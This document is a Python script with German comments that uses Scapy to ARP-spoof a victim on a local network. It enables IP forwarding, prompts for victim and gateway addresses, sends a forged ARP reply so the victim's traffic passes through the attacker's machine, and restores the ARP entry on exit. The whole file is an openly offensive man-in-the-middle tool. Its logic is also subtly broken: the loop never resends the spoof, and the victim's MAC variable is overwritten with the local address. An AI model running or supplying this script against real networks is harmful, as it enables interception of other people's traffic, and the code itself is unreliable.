#ARP-Spoofing ohne main Funktion

from scapy.all import *
import time
import os

def clearscreen():
    os.system("clear")

def doubleline():
    print("=" *100)

clearscreen()
doubleline()

ipForward = "/proc/sys/net/ipv4/ip_forward"
#Enable IP-Forwarding
file = open(f"{ipForward}", "w")
file.write("1")
file = open(f"{ipForward}", "r")
for line in file:
    line = line.strip()
    print(f"IP-Forward ist auf {line} gesetzt!")
file.close()

doubleline()

victim_ip = input("IP-Adresse vom Victim-PC eingeben: ")
gateway_ip = input("IP-Adresse vom Gateway eingeben: ")

doubleline()

#IP-Adresse vom lokalen Rechner (Attaker host_ip)
host_ip = get_if_addr(conf.iface)
print(f"Lokale Attaker-Host IP-Adresse ist: {host_ip}")

doubleline()

#Spoofing victim_ip gateway_ip
victim_mac = getmacbyip(victim_ip)
arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op="is-at")
send(arp_response)
victim_mac = ARP().hwsrc

try:
    while True:
        print(f"[+] Send to {victim_ip} : {gateway_ip} is at {victim_mac} on {host_ip}")
        time.sleep(1)
except KeyboardInterrupt:
    print("")
    print("[+] Deteced CRTL-c .... Network (MAC-Address) will restore ....")
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
    send(arp_response, count=7)
    time.sleep(1)
    print(f"[+] Send to {victim_ip} : {gateway_ip} is at {victim_mac} on {victim_ip}")

doubleline()

#Disable IP-Forwarding
file = open(f"{ipForward}", "w")
file.write("0")
file = open(f"{ipForward}", "r")
for line in file:
    line = line.strip()
    print(f"IP-Forward ist auf {line} gesetzt!")
file.close()

doubleline()

print("Das Programm ist beendet!!!!")








